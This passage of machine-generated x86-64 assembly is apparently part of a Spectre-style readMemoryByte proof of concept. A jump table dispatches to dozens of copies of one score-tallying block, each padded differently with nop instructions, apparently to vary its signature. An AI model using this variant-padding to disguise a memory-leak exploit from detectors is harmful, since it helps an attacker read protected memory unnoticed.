	cmpl	$48, %eax
	je	.LreadMemoryByte_win1_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win1_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win1_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win1_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win1_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win1_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win1_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win1_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win1_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win1_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win1_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win1_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win1_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win1_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win1_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win1_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win1_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win1_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win1_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win1_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win1_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win1_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win1_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win1_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win1_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win1_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win1_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win1_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win1_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win1_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win1_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win1_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win1_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win1_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win1_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win1_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win1_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win1_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win1_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win1_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win1_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win1_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win1_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win1_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win1_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win1_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win1_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win1_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win1_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win1_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win1_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win1_var99
	cmpl	$100, %eax
	je	.LreadMemoryByte_win1_var100
	cmpl	$101, %eax
	je	.LreadMemoryByte_win1_var101
	cmpl	$102, %eax
	je	.LreadMemoryByte_win1_var102
	cmpl	$103, %eax
	je	.LreadMemoryByte_win1_var103
	cmpl	$104, %eax
	je	.LreadMemoryByte_win1_var104
	cmpl	$105, %eax
	je	.LreadMemoryByte_win1_var105
	cmpl	$106, %eax
	je	.LreadMemoryByte_win1_var106
	cmpl	$107, %eax
	je	.LreadMemoryByte_win1_var107
	cmpl	$108, %eax
	je	.LreadMemoryByte_win1_var108
	cmpl	$109, %eax
	je	.LreadMemoryByte_win1_var109
	cmpl	$110, %eax
	je	.LreadMemoryByte_win1_var110
	cmpl	$111, %eax
	je	.LreadMemoryByte_win1_var111
	cmpl	$112, %eax
	je	.LreadMemoryByte_win1_var112
	cmpl	$113, %eax
	je	.LreadMemoryByte_win1_var113
	cmpl	$114, %eax
	je	.LreadMemoryByte_win1_var114
	cmpl	$115, %eax
	je	.LreadMemoryByte_win1_var115
	cmpl	$116, %eax
	je	.LreadMemoryByte_win1_var116
	cmpl	$117, %eax
	je	.LreadMemoryByte_win1_var117
	cmpl	$118, %eax
	je	.LreadMemoryByte_win1_var118
	cmpl	$119, %eax
	je	.LreadMemoryByte_win1_var119
	cmpl	$120, %eax
	je	.LreadMemoryByte_win1_var120
	cmpl	$121, %eax
	je	.LreadMemoryByte_win1_var121
	cmpl	$122, %eax
	je	.LreadMemoryByte_win1_var122
	cmpl	$123, %eax
	je	.LreadMemoryByte_win1_var123
	cmpl	$124, %eax
	je	.LreadMemoryByte_win1_var124
	cmpl	$125, %eax
	je	.LreadMemoryByte_win1_var125
	cmpl	$126, %eax
	je	.LreadMemoryByte_win1_var126
	cmpl	$127, %eax
	je	.LreadMemoryByte_win1_var127
	cmpl	$128, %eax
	je	.LreadMemoryByte_win1_var128
	cmpl	$129, %eax
	je	.LreadMemoryByte_win1_var129
	cmpl	$130, %eax
	je	.LreadMemoryByte_win1_var130
	cmpl	$131, %eax
	je	.LreadMemoryByte_win1_var131
	cmpl	$132, %eax
	je	.LreadMemoryByte_win1_var132
	cmpl	$133, %eax
	je	.LreadMemoryByte_win1_var133
	cmpl	$134, %eax
	je	.LreadMemoryByte_win1_var134
	cmpl	$135, %eax
	je	.LreadMemoryByte_win1_var135
	cmpl	$136, %eax
	je	.LreadMemoryByte_win1_var136
	cmpl	$137, %eax
	je	.LreadMemoryByte_win1_var137
	cmpl	$138, %eax
	je	.LreadMemoryByte_win1_var138
	cmpl	$139, %eax
	je	.LreadMemoryByte_win1_var139
	cmpl	$140, %eax
	je	.LreadMemoryByte_win1_var140
	cmpl	$141, %eax
	je	.LreadMemoryByte_win1_var141
	cmpl	$142, %eax
	je	.LreadMemoryByte_win1_var142
	cmpl	$143, %eax
	je	.LreadMemoryByte_win1_var143
	cmpl	$144, %eax
	je	.LreadMemoryByte_win1_var144
	cmpl	$145, %eax
	je	.LreadMemoryByte_win1_var145
	cmpl	$146, %eax
	je	.LreadMemoryByte_win1_var146
	cmpl	$147, %eax
	je	.LreadMemoryByte_win1_var147
	cmpl	$148, %eax
	je	.LreadMemoryByte_win1_var148
	cmpl	$149, %eax
	je	.LreadMemoryByte_win1_var149
	jmp	.LreadMemoryByte_win1_var0
## Variant 0
.LreadMemoryByte_win1_var0:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 1
.LreadMemoryByte_win1_var1:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 2
.LreadMemoryByte_win1_var2:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 3
.LreadMemoryByte_win1_var3:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 4
.LreadMemoryByte_win1_var4:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 5
.LreadMemoryByte_win1_var5:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 6
.LreadMemoryByte_win1_var6:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 7
.LreadMemoryByte_win1_var7:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 8
.LreadMemoryByte_win1_var8:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 9
.LreadMemoryByte_win1_var9:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 10
.LreadMemoryByte_win1_var10:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 11
.LreadMemoryByte_win1_var11:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 12
.LreadMemoryByte_win1_var12:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 13
.LreadMemoryByte_win1_var13:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 14
.LreadMemoryByte_win1_var14:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 15
.LreadMemoryByte_win1_var15:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 16
.LreadMemoryByte_win1_var16:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 17
.LreadMemoryByte_win1_var17:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 18
.LreadMemoryByte_win1_var18:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 19
.LreadMemoryByte_win1_var19:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 20
.LreadMemoryByte_win1_var20:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 21
.LreadMemoryByte_win1_var21:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 22
.LreadMemoryByte_win1_var22:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 23
.LreadMemoryByte_win1_var23:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 24
.LreadMemoryByte_win1_var24:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 25
.LreadMemoryByte_win1_var25:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 26
.LreadMemoryByte_win1_var26:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 27
.LreadMemoryByte_win1_var27:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 28
.LreadMemoryByte_win1_var28:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 29
.LreadMemoryByte_win1_var29:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 30
.LreadMemoryByte_win1_var30:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 31
.LreadMemoryByte_win1_var31:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 32
.LreadMemoryByte_win1_var32:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 33
.LreadMemoryByte_win1_var33:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 34
.LreadMemoryByte_win1_var34:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 35
.LreadMemoryByte_win1_var35:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 36
.LreadMemoryByte_win1_var36:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 37
.LreadMemoryByte_win1_var37:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 38
.LreadMemoryByte_win1_var38:
	popq	%rax
	nop
	nop
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 39
.LreadMemoryByte_win1_var39:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 40
.LreadMemoryByte_win1_var40:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 41
.LreadMemoryByte_win1_var41:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 42
.LreadMemoryByte_win1_var42:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 43
.LreadMemoryByte_win1_var43:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 44
.LreadMemoryByte_win1_var44:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 45
.LreadMemoryByte_win1_var45:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 46
.LreadMemoryByte_win1_var46:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 47
.LreadMemoryByte_win1_var47:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 48
.LreadMemoryByte_win1_var48:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 49
.LreadMemoryByte_win1_var49:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 50
.LreadMemoryByte_win1_var50:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
